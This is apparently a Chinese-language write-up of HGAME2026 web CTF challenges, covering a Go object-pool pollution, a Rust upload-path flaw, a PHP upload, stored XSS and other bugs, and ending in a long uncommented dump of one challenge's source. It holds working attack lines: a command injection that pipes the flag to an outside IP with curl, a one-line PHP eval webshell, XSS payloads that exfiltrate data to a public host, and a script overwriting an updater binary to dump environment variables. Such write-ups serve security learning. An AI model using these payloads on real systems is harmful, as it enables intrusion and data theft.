# HGAME2026 web复现

## MyMonitor

GO语言代码审计 + 对象池污染

拿到附件进行审计，MonitorPool是一个全局对象池，所有 handler（如 UserCmd, AdminCmd）都从这个池中获取 *MonitorStruct。

用完后应调用 reset() 清空字段，再放回池中。

```Go
var MonitorPool = &sync.Pool{
    New: func() any { return &MonitorStruct{} },
}
```

但是在UserCmd 在 error 路径下不会调用 `reset()`，这会导致导致触发err时，monitor 对象带着当前数据被直接放回池中

```Go
func UserCmd(c *gin.Context) {
    monitor := MonitorPool.Get().(*MonitorStruct)
    defer MonitorPool.Put(monitor)
    if err := c.ShouldBindJSON(monitor); err != nil {
        fmt.Println(monitor)
        c.JSON(400, gin.H{"error": err.Error()})
        //没有调用reset()就直接把对象放回对象池中
        return
    }
    fmt.Println(monitor)
    defer monitor.reset()
    if monitor.Cmd != "status" {
        c.JSON(403, gin.H{"response": "No permission to execute this command"})
        return
    }
    c.JSON(400, gin.H{"response": "Not implemented yet :("})
    return
}
```

查看前端源码，当payload没有args参数时，只会发送含有cmd参数的json

```JavaScript
const payload = { cmd };
if (args) payload.args = args;
```

但是在`AdminCmd()`中直接从对象池中获取一个对象,此时可以拿到上一个已经被污染的对象

```Go
monitor := MonitorPool.Get().(*MonitorStruct)
```

以下代码会自动解析HTTP 请求中的 JSON 数据，赋值到 monitor 结构体的对应字段上

```Go
if err := c.ShouldBindJSON(monitor);
```

但是admin执行ls命令，更新的是monitor.Cmd，而monitor.Args字段则为已经被污染的Args字段

```Go
fullCommand := fmt.Sprintf("%s %s", monitor.Cmd, monitor.Args)
output, err := exec.Command("bash", "-c", fullCommand).CombinedOutput()
```

那么我们可以只传递args字段触发err，污染对象池中的Args，题目提示**NaCl闲得发昏了写了个简易WebShell并隔一段时间输入“****ls****”命令**，我们的Args会被拼接到monitor.Cmd，成功执行命令

```HTTP
POST /api/user/cmd HTTP/1.1
Host: forward.vidar.club:30188
Content-Type: application/json
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNibiJ9.7ys1PC0FhovD_eNnYi5P3FgRcxN9elKQ4L8XyAtE8Xs
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Referer: http://forward.vidar.club:30188/user
Origin: http://forward.vidar.club:30188
Content-Length: 69

{"args":"&& cat /flag | curl -d @- http://114.51.419.198:10"}
```

## **easyuu**

抓包发现`/api/list_dir`接口下可以实现目录查看

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MDM1YjgzZTlkZWY4MjhiNTY4MmI3YjBhZGMyZTVkZGJfVkZJenVJWWlTR2FJZENoemJDVTVpVVNkdkJFMTM3dWtfVG9rZW46VnV4M2I1UmUwbzZ6V3h4NkNJS2NlbmF0bmdkXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

在下载接口编码相对路径`/api/download_file/..%2Fupdate%2Feasyuu.zip`拿到easyuu源码

在`upload_file()`，我们能通过传递`path1`字段控制文件上传路径

```Rust
pub async fn upload_file(data: MultipartData) -> Result<usize, ServerFnError> {
    use std::path::PathBuf;
    use tokio::fs::OpenOptions;
    use tokio::io::AsyncWriteExt;

    let mut data = data.into_inner().unwrap();
    let mut count = 0;
    let mut base_dir = PathBuf::from("./uploads");

    while let Ok(Some(mut field)) = data.next_field().await {
        match field.name().as_deref() {
            Some("path1") => {
                if let Ok(p) = field.text().await {
                    base_dir = PathBuf::from(p);
                }
                continue;
            }
            Some("file") => {
                let name = field.file_name().unwrap_or_default().to_string();
                let path = base_dir.join(&name);
                let mut file = OpenOptions::new()
                    .create(true)
                    .write(true)
                    .truncate(true)
                    .open(path)
                    .await?;
                while let Ok(Some(chunk)) = field.chunk().await {
                    let len = chunk.len();
                    count += len;
                    file.write_all(&chunk).await?;
                }
                file.flush().await?;
            }
            _ => continue,
        }
    }

    Ok(count)
}
```

同时发现程序有自更新机制，通过比对./update/easyuu的版本号来实现更新

```Rust
#[cfg(feature = "ssr")]
async fn get_new_version() -> Option<Version> {
    use tokio::process::Command;

    let output = Command::new("./update/easyuu")
        .arg("--version")
        .output()
        .await
        .ok()?;

    let version_str = String::from_utf8(output.stdout).ok()?.trim().to_string();
    Version::parse(&version_str).ok()
}

#[cfg(feature = "ssr")]
async fn update() -> Result<(), Box<dyn std::error::Error>> {
    let new_binary = "./update/easyuu";
    self_replace::self_replace(&new_binary)?;
    // fs::remove_file(&new_binary)?;
    Ok(())
}

#[cfg(feature = "ssr")]
fn restart_myself(path: std::path::PathBuf) {
    use std::os::unix::process::CommandExt;
    use std::process::Command;

    let _ = Command::new(path).exec();
}
```

在源码文件夹下发现存在git目录，查看git记录发现有print flag的commit，于是退回到上一个 commit

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MGNmZWZlZTcxNDdmMzk0NWY0YWM0NDdhZWMyMzg2Y2FfTzZYVFhvcFpZM09xZzJpcGtSNkhtTXhid1E0ODJYa2FfVG9rZW46QzN5WmJuTWpib1NZVHp4ZEdyWmNUaUppbkVnXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

手动修改程序版本号为更新的版本后重新编译，在上传easyuu文件即可

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjUyN2ZmMzNhNjYwNTg1MzhmMzRiYzdmYTIyYjI3MmZfdnVPTmYyQ25VY2VqcVFnRzR2TDExM1ozSjBxeUpnbGdfVG9rZW46RE91TWJ1eENrb3ZkM1R4aDVndmMxN240bjZkXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

另一种解法是通过上传恶意脚本覆盖 `/app/update/easyuu`，先上传payload.sh把环境变量写入文件`env.txt`

```Bash
#!/bin/sh
# 检查脚本的第一个命令行参数是否等于字符串 --version
if [ "$1" = "--version" ]; then
    # 把所有环境变量写入能读到的文件
    env > /app/uploads/env.txt
    # 2. 输出当前版本号 "0.1.0"，骗过版本检查
    echo "0.1.0"
fi
```

执行脚本更新easyuu，服务端主动调用，再下载env.txt查看flag

```Python
import requests
files=[
  ('path1',(None,'/app/update')),
  ('file',('easyuu',open('payload.sh','rb'),'application/octet-stream'))
]
requests.post('http://forward.vidar.club:31296/api/upload_file', files=files)
```

## **baby-web?**

附件中指出能上传php文件

```PHP
<?php
$target_dir = "uploads/";
if (!file_exists($target_dir)) mkdir($target_dir, 0777, true);

$uploadOk = 1;
$message = "";
$type = "error";

if(isset($_POST["submit"])) {
    $origName = $_FILES['fileToUpload']['name'];
    $target_file = $target_dir . $origName;

    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
        $message = "文件已上传，保存名：" . $origName;
        $type = "success";
    } else {
        $message = "抱歉，上传你的文件时出现了错误。";
    }

    if ($_FILES["fileToUpload"]["size"] > 10000000) {
        $message = "抱歉，你的文件太大了。";
        $uploadOk = 0;
    }
    $fileExt = strtolower(pathinfo($_FILES["fileToUpload"]["name"], PATHINFO_EXTENSION));
    $allowedTypes = ["jpg", "jpeg", "png", "gif", "pdf", "doc", "docx", "txt","htaccess","php"];
    if(!in_array($fileExt, $allowedTypes)) {
        $message = "抱歉，只允许上传 JPG, JPEG, PNG, GIF, PDF, DOC, DOCX & TXT 格式的文件。";
        $uploadOk = 0;
    }

    if ($uploadOk != 1)
    {
        if (file_exists($target_file))
            @unlink($target_file);
        $message .= " 你的文件没有被上传。";
    }
    
    header("Location: l0cked_myst3ry.php?message=" . urlencode($message) . "&type=" . urlencode($type));
    exit();
}
?>
```

写马`<?php eval($_POST['shell'])?>`上传但是没发现flag

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=YzU2ZGIzNmUwYzU5ZjI3NDE1OWUxN2IzYTkzNDVhZjFfRzljWFRxV0tDTjg5N1JQMWFMNjFTVkZQaHRuQkhFOThfVG9rZW46WVJXN2JMTWpJb1VKOHZ4MXpMb2MxWEtTbnRmXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

查看容器运行在10.0.0.1，外部无法直接访问，且内网存在 `10.0.0.2:3000` 运行 Next.js 服务

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=OWYyMzgyYmZjNDIyYjIwOTIxYmMyNWFlZGZkYWVlOGJfY0VyVzZROGtOZ3hXWWwyejhHNUhybFFwQzBSM0dhWU5fVG9rZW46TVJ6T2JEWHZsbzJqU0d4M1Z4d2NwZ3FJblJkXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

**魔理沙的魔法目录**

在开发者工具的网络流中发现`record`的api,抓包修改`time`字段

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjFlM2E4MmRhZGVmOWM4ZTIxOWI3NmYxZTExMzRmODZfV3FzQWc1ck1mNDR5bDRJeFB6c1E4V2cyakVGNGpwWTBfVG9rZW46Q0hxZ2JaT09Vb01Pamx4U3RmNWNidm9ubjdnXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

## 博丽神社的绘马挂 

登陆后写一个绘马再发布，查看前端明显是打储存型xxs，归档后发现在archoves的响应返回了json数据

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=OTEyNWRhZWZmMjJhNmZjOTAxM2E0NDEwYmQ5ZjZmMzNfTVlWMFd2V3FQNU1GTU1kUFJtMmxyV1gzOHBaVjF3UlVfVG9rZW46SmE5QmJSVm1Zb3U1Z1B4aUw0QWN3MElNbnNmXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

官方的目标是构造一个xss的payload让灵梦访问`/api/search`将查询的归档内容带出flag

```HTML
<img
  src="x"
  onerror="
  //创建全局可调用函数k
    window.k = function(d) {
      if (d.results) {
      //查找Hgame的内容，即flag
        for (var i = 0; i < d.results.length; i++) {
          var c = d.results[i].content;
          if (c.indexOf('Hgame') > -1) {
          //把flag的内容发送到/api/messages接口，带出数据
            fetch('/api/messages', {
              method: 'POST',
              headers: {
                'ContentType': 'application/json'
              },
              body: JSON.stringify({
                content: '[FLAG]' + c,
                is_private: false
              })
            });
            break;
          }
        }
      }
    };
    
    创建一个script元素为s
    var s = document.createElement('script');
    s.src = '/api/search?q=Hgame&callback=window.k';
    //插入DOM，执行script内容
    document.body.appendChild(s);
  "
>
```

自己的payload，直接将/api/archives数据外带

```HTML
<img src=x onerror="fetch('/api/archives').then(r=>r.json()).then(data=>{new Image().src='http://公网IP/get_flag.php?c='+btoa(JSON.stringify(data));});">
```

## Vidarshop

多次进行账号注册发现uid规律，注册1413914就是admin的uid

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2JmM2VkMmU1YzU1ZGJjNmI5ZTc2NTQwZjJhMGFlODZfSDJYUlpzWmJJTTg5MTFqTXVwbXNzRXFmeVdZcEZrbFhfVG9rZW46WThLRGJia0dlb1BaVVp4M1lFVmM4U2tabkFlXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

题目提示python反序列化，没想到balance是全局变量，一直以为是类属性

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmExYzJiYmU3M2Q3NjUxMjExOGM3Mzc5YTlhZjE3OTZfWjliNmxoRWtUUWdjRmVSWUl2YzlPdW1oOTFEUU5aTHBfVG9rZW46S3N1TWJ3dHpFb2cwVFJ4cGJGWGNvYTJMbjVlXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

返回商店购买即可

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ODVjMmNiOTUzYTJjY2VmODcxNzZjMDQ1Yjk2MTg5YjVfTm9jc2F5QjN4ZENZNm5aMnY3OGZoTXM3MzROb203R1pfVG9rZW46RU5JR2JmSklQbzVuZUl4eFpSYWMzZnZzbmdkXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

## **My Little Assistant**

能访问网页并且回显响应信息

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MzZkNzU5ZWYzMDA5NGE4ZjA2OWY4NDQxZjhkMjFjM2ZfYmFaR3BIT1prcE43bVNUNENjd0hBd29wbmhJZExpTDJfVG9rZW46Sjl2N2IzbFlFb1dYTkt4TExFVmNFSXFTbkRnXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

在服务器部署创建一个恶意网站，带出file:///flag，应该是个非预期

```HTML
<!DOCTYPE html>
<html>
<body>
    <script>
        // 如果当前地址不是 file 协议，就强行跳转
        if (window.location.protocol !== 'file:') {
            window.location.href = 'file:///flag';
        }
    </script>
</body>
</html>
```

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWZkMjA5ZGY0OTZhNTNiYzJlYzViYTkyZDY5Mzg5ZmZfR2tWNWo0ZnYyV0Y4Um1xV2JnR3N1SXp2YUFFeWdTNEhfVG9rZW46VUlPd2JMQ1Vsb0lpSlV4QnBkVmNVM25ObkFlXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)

## **《文文。新闻》**

```JavaScript
import http from 'http';
import httpProxy from 'http-proxy';

const RUST_TARGET = 'http://127.0.0.1:3000';
const VITE_TARGET = 'http://127.0.0.1:5173';

const proxy = httpProxy.createProxyServer({
  agent: new http.Agent({ 
    keepAlive: true, 
    maxSockets: 100,
    keepAliveMsecs: 10000 
  }),
  xfwd: true,
});

proxy.on('error', (err, req, res) => {
  console.error('[Proxy Error]', err.message);
  if (res && !res.headersSent) {
    try { res.writeHead(502); res.end('Bad Gateway'); } catch(e){}
  }
});

const server = http.createServer((req, res) => {
  if (req.url.startsWith('/api/')) {
    proxy.web(req, res, { target: RUST_TARGET });
  } else {
    proxy.web(req, res, { target: VITE_TARGET });
  }
});

console.log("馃敟 Node.js Dumb Proxy running on port 80");
server.listen(80);
mod http_parser;
mod handlers;
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use bytes::{BytesMut, Buf};
use http_parser::ParseResult;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>>{
    let listener = TcpListener::bind("0.0.0.0:3000").await?;
    println!("server running on 127.0.0.1:3000");

    loop {
        let (socket, _) = listener.accept().await?;

        tokio::spawn(async move {
            if let Err(e) = process_connection(socket).await {
                eprintln!("Connection error: {}", e);
            }
        });
    }
}

async fn process_connection(mut socket: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    let mut buffer = BytesMut::with_capacity(4096);

    loop {
        let n = socket.read_buf(&mut buffer).await?;

        if n == 0 {
            if buffer.is_empty() {
                return Ok(());
            } else {
                eprintln!("Connection closed with {} bytes remaining (garbage)", buffer.len());
                return Ok(());
            }
        }

        loop {
            match http_parser::parse_packet(&mut buffer) {
                ParseResult::Complete(req, consumed_len) => {
                    println!("Parsed request: {} {}", req.method, req.route);
                    let response = router(&req);
                    socket.write_all(response.as_bytes()).await?;
                    buffer.advance(consumed_len);
                }
                
                ParseResult::Partial => {
                    break;
                }
                
                ParseResult::Invalid(skip_len) => {
                    println!("Warning: Skipping {} bytes of garbage data...", skip_len);
                    // }
                    buffer.advance(skip_len);
                    
                    if buffer.is_empty() {
                        break;
                    }
                }
            }
        }
    }
}

fn router(req: &http_parser::Request) -> String {
    if req.version != "HTTP/1.1" {
        return handlers::resp_err("400 Bad Request", "Wrong HTTP Version. Only HTTP/1.1 is supported.");
    }

    if !req.queries.is_empty() {
        println!("  -> Query params: {:?}", req.queries);
    }

    match req.route.as_str() {
        "/api/register" => handlers::handle_register(req),
        "/api/login" => handlers::handle_login(req),
        "/api/comment" => handlers::handle_comment(req),
        _ => handlers::resp_not_found(),
    }
}
use crate::http_parser::Request;
use std::sync::Mutex;
use std::collections::HashMap;
use serde::{Deserialize, Serialize};
use lazy_static::lazy_static;
use uuid::Uuid;

lazy_static! {
    static ref USERS: Mutex<HashMap<String, UserRecord>> = Mutex::new(HashMap::new());
    
    static ref COMMENTS: Mutex<Vec<CommentData>> = Mutex::new(Vec::new());
}

#[derive(Deserialize)]
struct AuthRequest {
    username: String,
    password: String,
}

#[derive(Clone)] 
struct UserRecord {
    password: String,
    token: String,
}

#[derive(Serialize, Deserialize, Clone)]
struct CommentData {
    username: String,
    content: String,
}

fn make_resp(status: &str, body: &str) -> String {
    format!(
        "HTTP/1.1 {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
        status, body.len(), body
    )
}

fn resp_ok(msg: &str) -> String {
    make_resp("200 OK", msg)
}

pub fn resp_err(status: &str, msg: &str) -> String {
    make_resp(status, &format!(r#"{{"error": "{}"}}"#, msg))
}

pub fn handle_register(req: &Request) -> String {
    if req.method != "POST" { return resp_err("405 Method Not Allowed", "Only POST"); }

    let content_type = req.headers.get("content-type").map(|s| s.as_str()).unwrap_or("");
    let form: AuthRequest = if content_type.contains("application/json") {
        match req.parse_json() {
            Ok(d) => d,
            Err(_) => return resp_err("400 Bad Request", "Invalid JSON format"),
        }
    } else if content_type.contains("application/x-www-form-urlencoded") {
        let map = req.parse_form(); 
        
        let username = map.get("username").cloned().unwrap_or_default();
        let password = map.get("password").cloned().unwrap_or_default();

        if username.is_empty() || password.is_empty() {
             return resp_err("400 Bad Request", "Missing username or password");
        }

        AuthRequest { username, password }
    } else {
        return resp_err("415 Unsupported Media Type", "Content-Type must be json or form");
    };

    let mut db = USERS.lock().unwrap();
    if db.contains_key(&form.username) {
        return resp_err("409 Conflict", "User already exists");
    }
    let new_token = Uuid::new_v4().to_string();
    db.insert(
        form.username.clone(),
        UserRecord {
            password: form.password,
            token: new_token.clone(),
        }
    );
    println!("User registered: {} with token: {}", form.username, new_token);

    resp_ok(&format!(r#"{{"status": "registered", "token": "{}"}}"#, new_token))
}

pub fn handle_login(req: &Request) -> String {
    if req.method != "POST" { return resp_err("405 Method Not Allowed", "Only POST"); }

    let content_type = req.headers.get("content-type").map(|s| s.as_str()).unwrap_or("");
    let form: AuthRequest = if content_type.contains("application/json") {
        match req.parse_json() {
            Ok(d) => d,
            Err(_) => return resp_err("400 Bad Request", "Invalid JSON format"),
        }
    } else if content_type.contains("application/x-www-form-urlencoded") {
        let map = req.parse_form(); 
        
        let username = map.get("username").cloned().unwrap_or_default();
        let password = map.get("password").cloned().unwrap_or_default();

        if username.is_empty() || password.is_empty() {
            return resp_err("400 Bad Request", "Missing username or password");
        }

        AuthRequest { username, password }
    } else {
        return resp_err("415 Unsupported Media Type", "Content-Type must be json or form");
    };

    let db = USERS.lock().unwrap();
    
    if let Some(record) = db.get(&form.username) {
        if record.password == form.password {
            return resp_ok(&format!(r#"{{"status": "success", "token": "{}"}}"#, record.token));
        }
    }
    
    resp_err("401 Unauthorized", "Invalid credentials")
}

pub fn handle_comment(req: &Request) -> String {
    let auth_header = req.headers.get("authorization").map(|v| v.as_str());
    if auth_header.is_none() {
        return resp_err("401 Unauthorized", "Missing Authorization header");
    }
    let input_token = auth_header.unwrap();
    let mut current_user = String::new();
    {
        let db = USERS.lock().unwrap();
        for (username, record) in db.iter() {
            if record.token == input_token {
                current_user = username.clone();
                break;
            }
        }
    }

    if current_user.is_empty() {
        return resp_err("403 Forbidden", "Invalid Token");
    }

    match req.method.as_str() {
        "GET" => {
            let db = COMMENTS.lock().unwrap();
            let json = serde_json::to_string(&*db).unwrap_or("[]".to_string());
            resp_ok(&json)
        },

        "POST" => {
            #[derive(Deserialize)]
            struct NewComment { content: String }
            
            let content_type = req.headers.get("content-type").map(|s| s.as_str()).unwrap_or("");
            let new_comment: NewComment = if content_type.contains("application/json") {
                match req.parse_json() {
                    Ok(p) => p,
                    Err(_) => return resp_err("400 Bad Request", "Invalid JSON"),
                }
            } else if content_type.contains("application/x-www-form-urlencoded") {
                let map = req.parse_form();

                let content = map.get("content").cloned().unwrap_or_default();

                if content.is_empty() {
                    return resp_err("400 Bad Request", "Missing content");
                }

                NewComment { content }
            } else {
                return resp_err("415 Unsupported Media Type", "Content-Type must be json or form");
            };

            let mut comments = COMMENTS.lock().unwrap();

            println!("[HANDLER] Saving comment: {:?}", new_comment.content);
            
            comments.push(CommentData {
                username: current_user,
                content: new_comment.content,
            });

            resp_ok(r#"{"status": "comment added"}"#)
        },
        _ => resp_err("405 Method Not Allowed", "Method not supported"),
    }
}

pub fn resp_not_found() -> String {
    resp_err("404 Not Found", "Resource not found")
}
use bytes::BytesMut;
use std::{collections::HashMap, str};
use serde::Deserialize;

#[derive(Debug)]
pub struct Request {
    pub method: String,
    pub route: String,
    pub queries: HashMap<String, String>,
    pub version: String,
    pub headers: HashMap<String, String>,
    pub body: String
}

pub enum ParseResult {
    Complete(Request, usize),
    Partial,
    Invalid(usize),
}

impl Request {
    pub fn parse_form(&self) -> HashMap<String, String> {
        let mut map = HashMap::new();
        for pair in self.body.split('&') {
            if let Some((k, v)) = pair.split_once('=') {
                if !k.is_empty() {
                    map.insert(k.to_string(), v.to_string());
                }
            } else if !pair.is_empty() {
                map.insert(pair.to_string(), "".to_string());
            }
        }
        map
    }

    pub fn parse_json<T: for<'a> Deserialize<'a>>(&self) -> Result<T, serde_json::Error> {
        serde_json::from_str(&self.body)
    }
}

pub fn parse_packet(buffer: &mut BytesMut) -> ParseResult {
    let req_line_end = match buffer.windows(2).position(|w| w == b"\r\n") {
        Some(pos) => pos,
        None => return ParseResult::Partial,
    };

    let req_line_len = req_line_end + 2;
    
    let raw_req_line = match str::from_utf8(&buffer[..req_line_end]) {
        Ok(s) => s,
        Err(_) => return ParseResult::Invalid(req_line_len),
    };

    let (method, route, queries, version) = match parse_reqline(raw_req_line) {
        Some(res) => res,
        None => return ParseResult::Invalid(req_line_len),
    };

    let header_end = match buffer.windows(4).position(|w| w == b"\r\n\r\n") {
        Some(pos) => pos,
        None => return ParseResult::Partial,
    };

    let raw_headers = match str::from_utf8(&buffer[req_line_len..header_end]) {
        Ok(s) => s,
        Err(_) => return ParseResult::Invalid(header_end + 4),
    };
    let headers = parse_headers(raw_headers);

    let body_length: usize = headers
        .get("content-length")
        .and_then(|v| v.parse().ok())
        .unwrap_or(0);

    let total_len = header_end + 4 + body_length;
    if buffer.len() < total_len {
        return ParseResult::Partial;
    }

    let body_start = header_end + 4;
    let body_end = body_start + body_length;
    let body = str::from_utf8(&buffer[body_start..body_end]).unwrap_or("").to_string();

    ParseResult::Complete(
        Request {
            method,
            route,
            queries,
            version,
            headers,
            body,
        },
        total_len
    )
}

fn parse_headers(raw_headers: &str) -> HashMap<String, String> {
    let lines = raw_headers.lines();
    let mut headers: HashMap<String, String> = HashMap::new();
    for line in lines {
        if let Some((k, v)) = line.split_once(":") {
            if !k.is_empty() {
                headers.insert(
                    k.trim().to_lowercase(), 
                    v.trim().to_string()
                );
            }
        }
    }
    headers
}

fn parse_reqline(raw_req_line: &str) -> Option<(String, String, HashMap<String, String>, String)> {
    let mut raw_req_parts = raw_req_line.split_whitespace();
    let method = raw_req_parts.next()?.to_string();
    let raw_uri = raw_req_parts.next()?;
    let (path, queries) = parse_uri(raw_uri);
    let version = raw_req_parts.next()?.to_string();
    Some((method, path, queries
, version))
}

fn parse_uri(raw_uri: &str) -> (String, HashMap<String, String>) {
    let (path, raw_query) = match raw_uri.split_once("?") {
        Some((p, q)) => (p, q),
        None => (raw_uri, "")
    };

    let mut queries: HashMap<String, String> = HashMap::new();

    if !raw_query.is_empty() {
        for query in raw_query.split("&") {
            if query.is_empty() { continue; }

            let (k, v) = match query.split_once("=") {
                Some((k, v)) => (k, v),
                None => (query, "")
            };

            if !k.is_empty() {
                queries
        .insert(k.to_string(), v.to_string());
            }
        }
    }
    (path.to_string(), queries)
}
import __vite__cjsImport0_react_jsxDevRuntime from "/node_modules/.vite/deps/react_jsx-dev-runtime.js?v=f665dcff"; const jsxDEV = __vite__cjsImport0_react_jsxDevRuntime["jsxDEV"];
import __vite__cjsImport1_react from "/node_modules/.vite/deps/react.js?v=f665dcff"; const React = __vite__cjsImport1_react.__esModule ? __vite__cjsImport1_react.default : __vite__cjsImport1_react;
import __vite__cjsImport2_reactDom_client from "/node_modules/.vite/deps/react-dom_client.js?v=78d194e2"; const ReactDOM = __vite__cjsImport2_reactDom_client.__esModule ? __vite__cjsImport2_reactDom_client.default : __vite__cjsImport2_reactDom_client;
import App from "/src/App.jsx";
import "/src/index.css";
ReactDOM.createRoot(document.getElementById("root")).render(
  /* @__PURE__ */ jsxDEV(React.StrictMode, { children: /* @__PURE__ */ jsxDEV(App, {}, void 0, false, {
    fileName: "/app/frontend/src/main.jsx",
    lineNumber: 8,
    columnNumber: 5
  }, this) }, void 0, false, {
    fileName: "/app/frontend/src/main.jsx",
    lineNumber: 7,
    columnNumber: 3
  }, this)
);
import axios from "/node_modules/.vite/deps/axios.js?v=ae05c96b";

const request = axios.create({
  timeout: 5000
});

request.interceptors.request.use(config => {
  const token = localStorage.getItem('token');
  if (token) {
    config.headers['Authorization'] = token;
  }
  return config;
}, error => {
  return Promise.reject(error);
});

request.interceptors.response.use(response => {
  return response.data;
}, error => {
  if (error.response) {
    alert(error.response.data.error || 'Request Failed');
  }
  return Promise.reject(error);
});

export default request;
```